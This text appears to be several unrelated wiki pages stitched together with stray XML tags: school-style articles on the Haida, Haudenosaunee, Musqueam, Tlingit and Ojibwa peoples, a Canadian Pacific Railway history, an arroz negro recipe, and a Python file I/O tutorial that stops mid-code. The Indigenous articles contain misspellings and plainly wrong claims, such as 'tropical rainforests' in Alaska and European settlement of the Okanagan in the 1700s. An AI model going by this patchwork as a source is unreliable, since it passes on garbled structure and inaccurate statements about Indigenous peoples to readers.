Europeans started to settle the Okanogan valley in the 1700s for its warm weather for growing conditions.  Although no treaty has been made, there have been few conflicts between the first nations and European settlers.

      <text xml:space="preserve">== Location ==
The Haida are situated on the Queen Charlotte Islands, an archipelago off the mainland of British Columbia, which they affectionately call Haida Gwaii&lt;sup&gt;[1]&lt;/sup&gt; (Land of the People).&lt;sup&gt;[2]&lt;/sup&gt; A few Haida are also situated on southern Alaskan islands.


== Social Organization ==
Haida society is matrilineal. Everything is passed down through the maternal side. This includes property, titles, names, crests, and even such things as performances and songs. Out of all the Haida, there are two moieties (formerly known as clans), the Eagle and the Raven. Marriage was to occur across clans. Members of the Eagle moiety married members of the Raven moiety, and vice versa. One's membership in a clan was inherited matrilineally. Going even further still, each clan was divided into lineages, of which there are now approximately 40 occupying the two main villages Skidegate and Old Massett. Lineages are groups of families with common ancestry.&lt;sup&gt;[3]&lt;/sup&gt; The chief (a title inherited from the maternal uncle) of the lineage, was responsible for lineage property.


== Villages ==
Each Haida village was politically independent, but the Haida people have much pride in their clans, which are common ground between villages. Clan membership was promulgated through crests carven on totem poles, war canoes, masks, and other such objects.&lt;sup&gt;[4]&lt;/sup&gt; Haida villages are often built on shores, in one or two rows of houses. This is due to fish being a significant factor of Haida diet and economy. Their houses were often constructed of planks of red cedar, and corner posts supported the framework of wooden beams. The entrance was often a doorway carved either into the front of the house, or into a massive totem pole in the same location, one that was decorated elaborately with lineage and moiety crests.&lt;sup&gt;[5]&lt;/sup&gt;

      <text xml:space="preserve">= Location =

The Haudenosaunee were located primarily in present-day New York, between Lake Erie and the Hudson River. They inhabited a forested area below the St. Lawrence. 

== The Six Nations ==

Iroquois isn't to be confused with the Ontario Iroquoian, which was made up of the Huron, Petun, and Neutral, along with other Iroquoian groups that lived along the St. Lawrence River, who were in fact, enemies of the Iroquois Confederation. 
  
The confederation is made up of the Seneca, Cayuga, Onondaga, Oneida, and Mohawk, otherwise known as the Five Nations of the Haudenosaunee. In the early 1700s, one more Iroquoian group, the Tuscarora, joined the league so they changed the name to the Six Nations. Within the confederation, each tribe had a role to play. For example, the Mohawks were charged with defending the Eastern territory of the Iroquois Confederation. As well, the tribes weren't allowed to start a conflict unless the entire confederation was in favor of war.


== Society ==

The Iroquois were very democratic. In fact, when Europeans settled in Canada, they started to emulate the model that the Iroquois followed. The governing system became a large influence on democracy as we know it today.

Iroquois people were also matrilineal and matrilocal. Women were generally responsible for crops and their harvest. Other duties included curing hide to make clothes, taking care of the children, cooking, and weaving baskets. Men, on the other hand, did more of the heavy work. They were in charge of clearing the land. They were also to build the longhouses, as well as hunt and carve things like snowshoes, mortars and pestles, war clubs, bowls, bows and arrows, and ladles. After marriage, Iroquois couples went to live with the bride's family. The women of each clan selected a clanmother, who in turn selected the chiefs. Even though men were hunters, statesmen, protectors, and warriors, the women were responsible for almost everything else, and tended to be the heads of their families.
 
The Iroquois were led by two very different types of people: the chiefs and the sachems. The Chiefs were chosen for their great skill and courage as a warrior but the sachems had to be both wise and knowledgeable about their tribe. Their strong government was carefully organized, and council meetings and gatherings were often held to discuss issues. This united system gave the Iroquois nation their power.

== Villages ==

Certain things were taken into account when the Iroquois build their villages. A village should be built on hilltops so they could see enemies approach and utilize the height to defend themselves, in a clearing in a forest so the surrounding trees could be used to build longhouses and serve as firewood, near a supply of fresh water and near a river so that transportation would be easier.

The early Iroquois built villages of anywhere from 20 - 100 longhouses. The longhouses were built in random patterns so that if one of them caught on fire, the entire village wouldn't be burnt to the ground. Each longhouse was home to an extended family. Each nuclear family (family of mother, father, and children) occupied their own hearth within the longhouse. The villages were walled in by log palisades and surrounded by their fields, which were essential to their lives. The palisades had shelves built in, to hold rocks which would be used as a defense against enemies, and buckets of water to put out fires with.


== Shelter ==
 
Longhouses, typically 30 to 200 feet long, 15 to 25 feet wide, 10 to 20 feet high were the primary shelter of the Haudenosaunee. They were made of elm bark, tree trunks, and deer tendon. They start out as a rectangular frame of wooden poles that the Iroquois worked and bend to fit in the right places. Then the frame is covered with sections of bark. Holes in the roof let smoke from cooking fires escape but they could be covered with animals skins whenever it rained or snowed. Animal skins also covered the doors at the ends of the longhouse. Finally, directly above the door opening, the Iroquois would make a mark to show which clan they belonged to.
 
It was dark inside the longhouses due to the lack of windows. Bunk beds lined the walls; they doubled as benches during the day. Above the beds were shelves that held things like animal skins, clothes, pots, baskets (made of wood splints), food, bowls, corn husks, and tools. Sometimes there were woven screens that would divide the longhouse into sections to give families their privacy. Those families shared a cooking fire down the center path, which would also provide them with warmth and light.

== Food ==

The Iroquois life was very much centered around agriculture. As well as supply food, crops such as the Three Sisters (corn, beans, and squash) were valuable exports. Nuts and wild berries were collected and their diet was augmented by meat. The Iroquois even had maple sugar to sweeten their bread with. Only the men hunted deer, bear, rabbit, squirrel, raccoons, and fowl. After a boy killed his first deer, he was allowed to join in. Many of the plants in the forest provided them with medicine to cure deadly diseases.

== Clothing ==
 
Deer supplied most of the material for their clothing. Shirts, vests, wrap-around skirts, and moccasins (which could also be made of corn husks) that women wore were made of deerskin. In the colder areas up north, they were replaced with leggings and breechclothes. Women sometimes wore necklaces of shell beads and animal teeth. During the winter, rabbit fur capes and shawls kept them warm. The men wore breechclothes during the hot summers and changed to leather leggings and tunics when cold weather came. Clothing was a large part of the Iroquois culture. They were decorated with porcupine quills, shell beads, and dyed hair, and often showed symbols representing the owner's clan.

 
== Tools ==
 
The Iroquois made many tools to help them with their daily lives. Items such as woven baskets were used as storage or a carrying case. The mortar and pestle crushed corn to make cornmeal. Wooden cradle boards could be strapped onto a mother's back so she can tend to her infant while working. Hollowed-out log canoes made transportation a lot easier. A sharpened piece of rock tied to a minute carved piece of wood served as a knife, which had many uses, like cutting bark and scalping enemies. Spears, and bows and arrows, were used in hunting and fishing, but they were also useful in battles. Another important tool was the snowshoe. They were basically wooden frames onto which moccasins could be strapped. Snowshoes helped the Iroquois travel in winter by spreading out body weight thus keeping them from sinking into the snow. Life was hard for the Iroquois, but these tools and many others made things easier.
 
 
== Recreation ==
 
Games were a very important part of the Iroquois's culture, not only as entertainment, but also to practice skills that helped them in their adult lives. One example is the game of darts. It was played during the summer between two teams. Each player would have 6 darts or spears and the point of the game was to get it through a rolling hoop. The team with the best accuracy won. A favourite among the Iroquois was lacrosse. It was played with a stick with a net at one end, a ball (usually made of wood or animal skin), and a goal post at each end on the field. The players pass the ball around and try to score points. Sometimes these games go on for 2-3 days straight. Lacrosse improved the players' aim, strength, and speed. That game is still played today even by non First Natives.
 
Most of the children's games involved doing things the adults did. The boys role-played as hunters and warriors, using miniature bows and arrows to shoot targets. The girls played with faceless dolls. These dolls were made of cornhusks and lacked features because the Iroquois believed that if they did, a spirit would be harmed. Playing house prepared the young girls as future nurturers. Skills gained from playing the many games and sports help the Iroquois children throughout life.

== Culture ==
 
The Iroquois celebrate 6 big festivals every year. They were the New Year Festival, the Maple Festival, the Corn Planting Festival, the Strawberry Festival, the Green Corn Festival, and the Harvest Festival (Thanksgiving). Most were held in accordance with when they harvest corn, crops, strawberries, sap, and maple syrup, or during the planting season, except for the New Year Festival, which was the biggest and last 4 days. During the festivals, the Iroquois thanked the good spirits for health, clothes, food and happiness. They sang, danced, prayed and played games to the drumbeat and the shaking of rattles made from gourds and turtle shells.

A large part of native religion was curing. The Iroquois believe curing restored an individuals or a community's well-being by driving off the evil spirits that caused sickness and death. The False Face Society was perhaps one of the best known curing societies in the lower Great Lakes region. They wore masks of mythological beings carved from specially selected living trees, then painted and decorated with fibers of hair. The False Faces were believed to have powers and held ceremonies at certain times of the year to ward off disease. They danced and chanted and rubbed ashes on the heads of the sick to cure them. In return, they were paid tobacco and hot corn mush. The members were always men, however their leader and keeper of the False Faces was always a woman. The performers had to be initiated into the originally secret society either by seeing them in a dream or being cured by them.
 

== Warfare ==

The Iroquois were mighty warriors. Other tribes looked to them for protection or as a deadly menace. During the French and Indian War (1754-1763) between the French and the English, they sided with the British and many historians promote the idea that if not for their involvement, North America would have been divided between the both French and the English. As it turns out, Britain conquered what is now America (later, America gained her freedom during the American Revolution) and Canada (who created its own constitution without warfare). 
  

=== Mahicans/Mohawks === 
     
The Mohawks and the Mohicans hated each other so they were constantly at each others' throats. The perpetual warfare made them fierce, aggressive tribes. When they both sided with the British (against the French), the Mohicans and the Mohawks entered a state of strained peace. 
  
In 1609, the arrival of the Dutch brought an abundance of valuable European goods. The location of the Mohican land in the Hudson River Valley made them appealing partners for trade. The Dutch/Mohican economic alliance brought prosperity to both nations. The Dutch got rich off the beautiful beaver pelts which were very popular in Europe. Likewise, the Mohicans got firearms which made them both powerful and wealthy, as they now controlled the trade monopoly in the area between the Hudson River Valley and Lake Champlain which was controlled by the French. 
  
These factors combined stirred the Mohawks into retaliation because they were jealous of the Mohican's success, hated the pro-French Indians, were frustrated with their exclusion from the trading with the Dutch and the wampum produced in Delaware. (Wampum is a string of creamy white shells from channeled whelk; they were highly valued by the First Natives and later, the Europeans used them as a medium of exchange). 
     
The constant Mohican/Mohawk wars were bad for business so the Dutch negotiated an agreement where the Mohawks paid the Mohicans a toll to travel through their lands so they could trade with the Dutch. The Mohawks were resentful about paying the Mohicans but this arrangement managed to last for six years, until 1624, when the Dutch trading company traded hands. They began to seek out other tribes to trade with because the beavers in the valley were disappearing from over-trapping, so the Mohicans contacted the Algonkin and Montagnais (in the northern St. Lawrence region), who were allies of the French, thus enemies of the Mohawks. When the Mohawks found out, they attacked. 
  
In the past, the Mohicans were victorious against the Mohawks but now the Mohawks were stronger and armed with guns. The next two years were a downward spiral as the Mohican population declined to approximately 1000 and were forced to pay a toll to the Mohawks until the weakened nation surrendered its sovereignty in 1672 and become the first of the Mohawk's Covenant Chain. In the end, the Mohawks took over the control of trade in the Hudson River Valley and the Dutch were defeated by the British, who took Fort Amsterdam in 1664.

      <text xml:space="preserve">= The Musqueam =



The Musqueam – people of the river grass- have flourished and dwindled over the past nine thousand years, just like the river grass. Before the arrival of Europeans, they lived to the rhythm of the land. They fished, hunted, gathered, and trapped for subsistence along the shores of Burrard Inlet, the Mouth of the Fraser, and the borders of English Bay.


==Food==


The Musqueam enjoyed a varied diet in the prosperous Greater Vancouver area. Salmon, the Musqueam’s staple diet, were caught using specialized equipment like trawl and dip nets and weirs. They were then cooked with hot stones in wooden troughs or smoked for winter. Bows, arrows, nets, and snares were used to catch dear, elk, bear, goat, and birds. Cleverly designed harpoons contained heads tied to lines that separated from the shafts upon contact. These enabled the hunting of seal, porpoise, and sturgeon. Shellfish, edible roots, berries and the wapato (a type of native potato) were gathered and harvested as well.


==Winter==


Their vast stores of preserved food allowed the Musqueam to live in comfort during the wet, cold winter. Elders recounted stories before smoldering fires. Ritual dances were performed accompanied by singing and drumming. These dancers often wore feathered costumes or plumed, bug-eyed skhwaykhwey masks. Feasts were savored and a host of games were played. Work that could be performed indoors was also done. Stones, bones, and wood were carved into sacred and utilitarian objects. Clothing was also sewn and objects such as nets repaired.


==Village Structure==


Cedar plankhouses, divided into rooms by mats, served as spacious dwellings for family groups. Outside, totem poles with life sized statues of people, birds, and beasts guarded the homes. Holes carved at the base of these totem poles allowed comings and goings. Separated from the plankhouses, smoke and sweat houses served ritual purposes of cleansing.


==Trade==


Trade was an important element of Musqueam life. With neighboring tribes, they traded decorative and ceremonial items - dentalia shells, mother-of-pearl, copper, iron and jade. Foodstuffs, textiles, and domestic materials were also readily exchanged.


==Class System==


Kinship patterns dictated the lives of the people, determining a family’s fishing, hunting and gathering rights. At the bottom of the hierarchy, slaves, captured during inter-tribal warfare, performed menial tasks for high ranking chiefs.


==Death==


The Musqueam did not bury their dead. Wrapped in a blanket or mats, the deceased was ceremoniously laid to rest on elevated platforms built on treetops.


==Beauty==


Beauty to the Musqueam was very different from today’s cover girl. Cedar boards were tied to the heads of infants and secured with a strap to the cradle in order to bend the skull into a pointed shape and attain a flat, wide forehead. Men kept their hair cropped at shoulder length. When at war or working, it was pinned in the back. Otherwise, they left it down. Women braided their hair in two from a center part. At puberty, a girl’s hairline was slightly raised through plucking.


==Clothing==


Clothing was fashioned from skins or cedar bark. In the summer, men went about naked while women wore a knee-length skirt of wool, deerskin, or shredded bark. Clothing for cooler weather consisted of a large animal skin, usually with the fur on. A hole was cut in the middle and a belt tied the garment to the waist. Difficult to prepare and rare, buckskin was mostly reserved for the winter dancers. Goat skin, even rarer than buckskin, marked a person’s status. Only the wives and daughters of rich men could afford to wear the aprons produced from this material.

      <text xml:space="preserve">The Tlingit (also sometimes known as the Tlinkit although this name is considered inaccurate) were a seafaring group of first nations who lived on the many islands and the coast of Alaska.They are closely related to the Haida. 
 

== Environment ==

The Tlingit are the most Northern group of the Northwest coast peoples who range from Alaska all the way down to Oregon. They live in the Alaska Panhandle, surrounded by the tidewater and many coastal mountains. The heavy rainfall creates tropical rainforests and a temperate climate. The many islands off the coast of Alaska form a protected waterway, called the Inland Passage, that is ideal and regularly used for transportation and communication.
 

== Language ==

Tingl, an Alaskan language traditionally spoken by people of the Tlingit ancestary, although there are many dialects of it. Today, there are approximately 700 Tinglit speakers left, most of whom are elders. Some people are still struggling to keep their native alive and learn it while they are young however. 
 

== Food ==

The Tlingit ate a lot of fish, mainly salmon, halibut, and oolakan. Also in their diet was seal and deer as well as an abundance of berries, roots, and seaweed. If food became an issue during the winter, they relied on clam beds. During the summer, tribes would stock up of food and dry or pickle it so it would last them throughout the winter.
 

== Housing ==

People lived in large plank houses built from cedar wood. 
 

== Totem Poles ==

Carved from cedar wood and up to 20ft tall, tomtem poles had many porposes. They could be used as decoration, door posts, welcoming posts, or memorials to the dead. These poles were used to tell stories about the village or a particular family. They were commonly decorated with carvings of crests or animals such as the beaver, bear, wolf, whale, raven, eagle, and frog.
 

== Potlatch ==

This is a huge ceremony and feast celebrated by all first nation groups of the Northwest Coast. The host would invite many people from different villages to come sing, fest, dance, and tell stories for several days. The host would give gifts and try to impress his guests. This potlatches were usually held to celebrate a wedding or birth of a son.
 

== Society ==

The Tlingits are divided into two different tribes, the Ravens and the Eagles/Wolves. Both of these tribes have many smaller clans within it. People must marry outside of their clans; Raven members can only marry Eagle members and vice versa. When born, a person belongs to their mothers clan.
 

== Modern Culture ==

Today the Tlingit share a common government with the Haida and the two groups are very similar. Most people either work in fishing or logging industries or have moved to larger cities.

      <text xml:space="preserve">== Creation of the Railway ==
At the start, nobody was quite clear as to what the railway would look like. One of the main reasons for the Canadian Pacific Railway to be built was the fact that British Columbia would only join Canada if transportation between the East and West coasts was improved. As a result, John A. Macdonald promised that a transcontinental railway would be built in less than 10 years. It is thought that if MacDonald had known what the end cost would be, he may not have made the promise of a railroad. It was mostly a scheme to measure up to the United States at the time, which could only be achieved by building transportation and communication links. These changes had to be made quickly too, before Canada was assimilated by the United States.

First, MacDonald had to find people to do the building for him. This was done, of course, in exchange for financial benefits during and after the building of the railroad. He also hired thousands of Chinese workers who would work hard, long and cheap. Following the initial hiring and planning, frantic railway building began. Technology to go through mountains was not available back then, and an appropriate mountain pass had to be found in order for the railway to be completed.

Many industrialists, including Jay Cooke, began to see that this railway had great economic potential. However, the only industrialist that had the money to finance a railway was Sir Hugh Allan. It was proposed that Allan take on the project and he agreed, but only if he had American support. In the summer of 1871, Allan created the Canadian Pacific Railway, a company that seemed to be entirely Canadian but was actually controlled by Jay Cooke's Northern Pacific Railway.

Through the building of this railway, a governmental lapse had occurred in the conservative party which was known as the “Pacific Scandal”. This episode resulted in the resignation of MacDonald’s government. Alexander Mackenzie and the Liberals then took power and they disagreed with MacDonald, saying that the railway was much too expensive and troublesome. Mackenzie did not provide funding during his administration, so railway building ceased for the time being. Surveys as to where the railway would go continued, however, which would be useful information for the later building of the railroad and for the knowledge of the geography of the nation. Mackenzie's &quot;do nothing&quot; attitude did not sit well with the people and he was soon out of office.

MacDonald and his party, after recovering from the Pacific Scandal, returned back to office and created a national policy that dealt with three things: a system of protective tariffs, western settlement, and the CPR. The tariffs protected the Canadian market; giving them a sort of economic independence from the United States. The western settlement encouraged movement to the west because of the great potential for farming and agriculture. The Canadian Pacific Railway was the cornerstone of it all, though. Without the CPR, agriculture and transportation would not be successful in the west.

As the railway building got underway again, private investment was soon needed to continue with this endeavor. Private investors bought the St. Paul and the Pacific Railway and turned it around for a $17 million dollar profit. MacDonald proposed that upon completion of the railway, they would receive $25 million and 25 million acres. As soon as the contract was approved the investors changed the route of the railway, which caused much controversy, and also brought about much more control over the prairies and their new towns. The change in route also meant that the earlier surveying done when Mackenzie was in office, was then irrelevant. Things were falling apart in terms of building, and someone very exceptional was needed to take over this project to avoid failure.

William Van Horne, a manager of a smaller railway in America, was chosen to undertake this project. For four years he drove the workers and himself to complete CPR as efficiently as they could. Van Horne was thought to be the person who would help the CPR meet its building deadline. Funding became limited and Van Horne had to cut many corners, finding alternatives to the original plan. Safety was risked and working conditions dropped. The CPR was being built entirely by hand and still needed to be completed.

When the Northwest Rebellion broke out, the CPR allowed the federal government to react to the crisis as soon as possible. This helped the government to see that the completion of the railroad was necessary and it was decided that the project would be funded towards completion. The CPR was completed on November 7th, 1885. Although there were still gaps in the track. The final cost of the project was over $37 million. The transcontinental link was completed as well, by the fall of 1885, 5 years ahead of schedule.

== Results and Benefits of Building the Railway ==

The CPR resulted in many improvements in new Canadian towns. The first necessary small hotels sprang up. The CPR also started a postal service and a telephone service. National parks were established, drawing many people toward them, especially in the areas with hot springs. The railway also drew adventurous, thrill-seeking people towards climbing the Rocky Mountains. The Prairies were available for settlement as well, and the completion of the CPR helped to draw Europeans there. Agricultural development soon took off with wheat farming and irrigation. The industrialized east coast began to transfer business along the CPR line, and used the west coast as a window to trading with the Far East. The CPR opened up the western half of Canada to many opportunities that it would not have had without a transportation system. For example, CPR workers drilling for water in Alberta discovered the first natural gas of the province in 1883.

Not only did the CPR increase the standard of living and the quality of many Canadian towns and services, but it also helped in times of crisis. As previously stated, the Canadian Pacific Railway enabled the government to react quickly to the Northwest Rebellion, a very important thing for the government to do. The CPR also helped to transport war supplies and weapons during the First World War. When the Second World War occurred, the CPR once again helped transport ammunition and supplies.

In the 1960's, the CPR switched entirely from steam to diesel locomotives. The Canadian Pacific Railway then changed its name to Canadian Pacific Limited, a company that aimed to operate more than just the railway. Some of the other business ventures this company eventually got involved in and operated were mines, ships, hotels, minerals &amp; manufacturing, telecommunications, airlines, real estate and trucking.  Canadian Pacific Air Lines, or CP Air, was even Canada's largest airline for a brief period of time, when it was flying from Vancouver to Amsterdam over the North Pole.

      <text xml:space="preserve">The Ojibwa are the largest group of First-Nation Indians above the Mexican Border. The tribe currently consists of around 219,000 members. The Ojibwa are also known as the Chippewa and as the Saltueurs by the French. The tribe was associated with the name Chippewa because of a different pronunciation. If you place an &quot;O&quot; in front (forming O'Chippewa) the relationship is more apparent. The Ojibwa were the largest and most powerful Great Lakes tribe &lt;ref&gt;http://www.tolatsga.org/ojib.html&lt;/ref&gt;. They were formerly located at the outlet of Lake Superior, mainly around the Sault Ste. Marie area. The Ojibwa are now located primarily in the United States of America and Canada. Ojibwa who moved to the Prairie provinces of Canada are known as Saulteurs. The tribes who were originally from the Mississagi River and moved to southern Ontario are called the Mississaugas 



== Food ==
All Ojibwa were hunters and gatherers. The hunting was done with bows, arrows, spears and clubs. Spear fishing was done at night in a birch bark canoe with the aid of flaming torches which attracted the fish. Traps, snares and deadfalls were also used to catch prey, such as deer, moose, elk, bears and small animals and birds. Fish were plentiful, along with berries, nuts, roots, seeds and the most important crop: wild rice. Their diet was low-carb and consisted of lots of protein and seasonal fruits, plant stocks and roots. 
The Ojibwa in the south had all of the foods above, but the climate and terrain made it suitable for agriculture. They could grow gardens of corn and beans because of the better soil conditions and warm climate
The Ojibwa in the Northern Great Lakes were faced with a short growing season and poor soil. They couldn't grow corn or beans like the Southern Ojibwa so they harvested wild rice and maple sugar. They had no salt to use as preservatives so they mixed their food with maple syrup as seasoning. Fishing was very important for the Woodland Ojibwa and fish, such as the sturgeon, was a big part of their diet. They rarely used horses or hunted buffalo. Dogs, however, were the only domestic animal to be served at their feasts.

== Religion    ==
The Ojibwa religion was mainly self centered and focused on the belief in power received from spirits during visions and dreams. Some of the forces and spirits in Ojibwa belief were benign and not feared, such as Sun, Moon, Four Winds, Thunder and Lightning. Bad spirits, like ghosts, witches and Windigo (a supernatural cannibalistic giant) were feared. 
The Ojibwa believe that the natural world was inhabited by both good and evil spirits, some of which required special treatment. A Shaman would cure the ill and perform Shaking Tent rites to communicate with the spirits. A Shaking Tent rite was a popular ceremony among the Ojibwa, Innu, Cree, Penobscot and Abenaki. The client would pay a Shaman to build his or her tent and the Shaman would enter it at dark. Singing and Drumming was used to summon the Shaman's spirit helpers, whose arrival was signaled by the shaking of the tent and animal cries. The spirits were used to cure the ill and for anti-sorcery &lt;ref&gt;http://www.thecanadianencyclopedia.com/index.cfm?PgNm=TCE&amp;Params=A1ARTA0007318&lt;/ref&gt;. 
Due to the missionization by the Anglican and Roman Catholic Church in the nineteenth century, the religious orientation of the Ojibwa was a mix of Christian and traditional native beliefs by the mid-twentieth century &lt;ref&gt;http://www.everyculture.com/North-America/Ojibwa-Religion-and-Expressive-Culture.html&lt;/ref&gt;.

== Clothing ==
Before the first European contact, the Ojibwa wore animal skins (primarily tanned deerskin.) The women wore deerskin leggings, moccasins, dresses and petticoats made of woven nettle or thistle fibers. Girls and women decorated their clothing with bones, feathers, shells, stones and dyed porcupine quills using thorn or bone needles and thread made from nettles or animal sinew. Megis Shells were used for bead work and jewellery, and also for trade and barter. The men also wore leggings and moccasins, along with breechcloths. Animal bones, claws, and teeth were strung into necklaces.  Moccasins, leggings, bandolier bags, and aprons were decorated with beads and quill work.  Men and women normally wore their hair long and braided. In times of war, men might change their style into a scalplock. The Ojibwa began to wear woven clothing after European contact. The Europeans also introduced glass beads to the Ojibwa.

== Language ==
The Ojibwa speak a Central Algonquian language which is closely related to Algonquian, Ottawa, Cree and Potawatomi. As of 2000, Ojibwe is spoken by 69,868 people&lt;ref&gt;http://www.census.gov/prod/cen2000/phc-5-pt1.pdf&lt;/ref&gt;. There are 5 main dialects: Northern Ojibwe, Southern Ojibwe, Eastern Ojibwe, Western Ojibwe and Ottawa. Speakers of different dialects can easily converse with each other because the languages are closely related&lt;ref&gt;http://www.native-languages.org/ojibwe.htm&lt;/ref&gt;.

== Homes ==
[[Image:Ojibwa wigwam.jpg|Thumb|right|150px|A Wigwam with a domed roof.]]
The typical home for an Ojibwa person was a wiigiwaam (or a Wigwam) with either a pointed roof (called a Nasawa'ogaan) or domed roof (called a Waginowaan.)It was constructed out of birch bark, juniper bark and willow saplings. Wigwams are not like tipis. The structure usually took longer to put up and it was not portable like the tipi. There would be a hole in the roof for the smoke from the fire to escape. A typical wigwam was home to one or more families. 
The Ojibwa who lived on the Great Plains constructed tipi's out of buffalo hide&lt;ref&gt;http://www.bigorrin.org/chippewa_kids.htm&lt;/ref&gt;

== War ==
The Ojibwa often scalped other enemies, but did not torture as a rule. There was ritual cannibalism of their dead enemies, like other Great Lake warriors. As previously mentioned, the Ojibwa men would often wear their hair in a scalplock during a war.

{{recipe}} | [[Cookbook:Cuisine of Spain|Cuisine of Spain]] | [[Cookbook:Rice Recipes|Rice Recipes]]

''Arroz negro'' or ''arròs negre'' (black rice in Spanish and Catalan respectively) is a Valencian dish of cuttlefish (or [[cookbook:squid|squid]]) and [[cookbook:rice|rice]] which is very similar to seafood paella. In fact, some call it ''paella negra'' (black paella in Spanish).

''Arroz negro'' should not be confused with black rice, the collective name for several types of rice that have a naturally dark color.

The traditional recipe for this dish calls for squid ink, cuttlefish or squid, rice, [[cookbook:garlic|garlic]], green cubanelle peppers, sweet [[Cookbook:paprika|paprika]], [[cookbook:Olive Oil|olive oil]] and seafood broth. However, many cooks add other seafood as well, such as [[cookbook:crab|crab]] and [[cookbook:shrimp|shrimp]].

The dish's dark color comes from the ink which also enhances its seafood flavor.

In addition to Valencia, this dish is popular in Cuba and Puerto Rico where on both islands it's known as ''arroz con calamares'' (rice with squid in Spanish).

The below recipe&lt;ref&gt;[http://www.lacocinadejuanry.es/arroznegro.html Video in Spanish of Juanry Seguí preparing arroz negro]&lt;/ref&gt; is based on the one by Juanry Seguí, a prominent Valencian chef.

==Conversion tables==
Here's a great website with conversion tables for the metric and US measuring systems:
[http://www.botanical.com/botanical/cvcookix.html]

==Equipment==
*A 15-inch (38-centimeter) ''paellera''
*A two-gallon pot
*A rice skimmer
*A sharp chopping knife for meat and vegetables
*A large serving spoon
*A potato masher
*A clean, white towel large enough to cover the ''paellera''
*A wide heating source such as:  
:#A stove large enough to accomodate the size of the ''paellera'' (You'll have to straddle two burners at once and rotate the ''paellera'' periodically for even cooking.) 
:#A gas burne designed specifically for ''paelleras'' 
:#A charcoal barbecue 
:#A low, forged steel to support the ''paellera''
==Recipe==
'''Please read ''[[cookbook:paella cooking techniques|Paella cooking techniques]]'' before attempting this recipe.'''
===Ingredients===
====Paella====
*3 pounds diced squid
*1 pounds green cubanelle peppers
*6 cloves of minced garlic
*2 cups Valencian rice
*3 teaspoons squid ink
*1 tablespoon sweet paprika
*1 tablespoon sea salt
*olive oil

====Broth====
*8 oz crab
*8 oz smelt or fish heads
*1 medium [[cookbook:onion|onion]]
*1 medium green or red [[wikipedia:bell pepper|bell pepper]]
*3 cloves of garlic
*2 [[Cookbook:Bay Leaf|bay leaves]] 
*1 gallon of water

===Procedure===
====Broth====
#Cut one onion and one bell pepper into quarters and place in a large pot with the rest of the broth ingredients. 
#Boil for about 30 minutes. Occasionally press the ingredients against the bottom of the pot with a [[wikipedia:potato masher|potato masher]] or ladle to squeeze out their flavors. 
#Strain the broth and set aside. Discard the boiled seafood.
''Tip: To save time, start preparaing the paella once the broth starts boiling.''

====Paella====
#Pour enough oil into a ''paellera'' to cover the bottom and heat over a medium flame.
#Add one teaspoon of salt to cubanelles and [[cookbook:sautéing|sauté]] until soft.
#Add squid and sauté for two minutes.
#Add garlic and sauté until brown (be careful not to burn).
#Add rice and braise until coated with oil.
#Add paprika and sauté for no more than 15 seconds then quickly add four cups of broth to prevent the paprika from burning.
#Add squid ink and mix well.
#Bring broth to a boil and then [[wikipedia:Simmering|simmer]] for two minutes.
#Taste the broth and invite your dinner guests to do so as well. If it tastes bland, add one teaspoon of salt at a time until everybody approves.
#Add the rice.
#Begin tasting the rice after it's been simmering for about 20 minute and reduce the heat a bit. Make sure the rice doesn't get too soft. Check the rice again every 10 minutes and reduce the heat slightly after each taste. Your goal is to wind up with rice that has a slightly underdone center. The time it takes to reach this point can vary from 30 minutes to an hour depending on your cooking gear.
#Your paella is done once you've accomplished the following three things: A) The rice should be slightly firm to the bite. Italians use the same approach when cooking pasta. They call this texture ''[[Cookbook:al dente|al dente]]''. B) The paella should be a little moist but not soupy. C) You should have a bit of toasted rice on the bottom of the ''paellera''. This is considered a delicacy throughout the Spanish-speaking world.
#Remove the ''paellera'' from the heat and cover it with a white towel (NOT ALUMINUM FOIL). Allow it to sit for five minutes before serving.

      <text xml:space="preserve">=== File I/O ===

Here is a simple example of file I/O (input/output):
&lt;source lang=&quot;python&quot;&gt;
# Write a file
with open(&quot;test.txt&quot;, &quot;wt&quot;) as out_file:
    out_file.write(&quot;This Text is going to out file\nLook at it and see!&quot;)

# Read a file
with open(&quot;test.txt&quot;, &quot;rt&quot;) as in_file:
    text = in_file.read()

print(text)
&lt;/source&gt;

The output and the contents of the file &lt;code&gt;test.txt&lt;/code&gt; are:

 This Text is going to out file
 Look at it and see!

Notice that it wrote a file called &lt;code&gt;test.txt&lt;/code&gt; in the directory that you ran the program from.  The &lt;code&gt;\n&lt;/code&gt; in the string tells Python to put a ''n''ewline where it is.  

A overview of file I/O is:
* Get a file object with the &lt;code&gt;open&lt;/code&gt; function
* Read or write to the file object (depending on how it was opened)
* If you did not use &lt;code&gt;with&lt;/code&gt; to open the file, you'd have to close it manually

The first step is to get a file object.  The way to do this is to use the &lt;code&gt;open&lt;/code&gt; function.  The format is &lt;code&gt;file_object = open(filename, mode)&lt;/code&gt;  where &lt;code&gt;file_object&lt;/code&gt; is the variable to put the file object, &lt;code&gt;filename&lt;/code&gt; is a string with the filename, and &lt;code&gt;mode&lt;/code&gt; is &lt;code&gt;&quot;rt&quot;&lt;/code&gt; to ''r''ead a file as ''t''ext or &lt;code&gt;&quot;wt&quot;&lt;/code&gt; to ''w''rite a file as ''t''ext (and a few others we will skip here).  Next the file objects functions can be called.  The two most common functions are &lt;code&gt;read&lt;/code&gt; and &lt;code&gt;write&lt;/code&gt;.  The &lt;code&gt;write&lt;/code&gt; function adds a string to the end of the file.  The &lt;code&gt;read&lt;/code&gt; function reads the next thing in the file and returns it as a string.  If no argument is given it will return the whole file (as done in the example).  

Now here is a new version of the phone numbers program that we made earlier:

&lt;source lang=&quot;python&quot;&gt;
def print_numbers(numbers):
    print(&quot;Telephone Numbers:&quot;)
    for k, v in numbers.items():
        print(&quot;Name:&quot;, k, &quot;\tNumber:&quot;, v)
    print()

def add_number(numbers, name, number):
    numbers[name] = number

def lookup_number(numbers, name):
    if name in numbers:
        return &quot;The number is &quot; + numbers[name]
    else:
        return name + &quot; was not found&quot;

def remove_number(numbers, name):
    if name in numbers:
        del numbers[name]
    else:
        print(name,&quot; was not found&quot;)

def load_numbers(numbers, filename):
    in_file = open(filename, &quot;rt&quot;)
    while True:
        in_line = in_file.readline()
        if not in_line:
            break
        in_line = in_line[:-1]
        name, number = in_line.split(&quot;,&quot;)
        numbers[name] = number
    in_file.close()

def save_numbers(numbers, filename):
    out_file = open(filename, &quot;wt&quot;)
    for k, v in numbers.items():
        out_file.write(k + &quot;,&quot; + v + &quot;\n&quot;)
    out_file.close()

def print_menu():
    print('1. Print Phone Numbers')
    print('2. Add a Phone Number')
    print('3. Remove a Phone Number')
    print('4. Lookup a Phone Number')
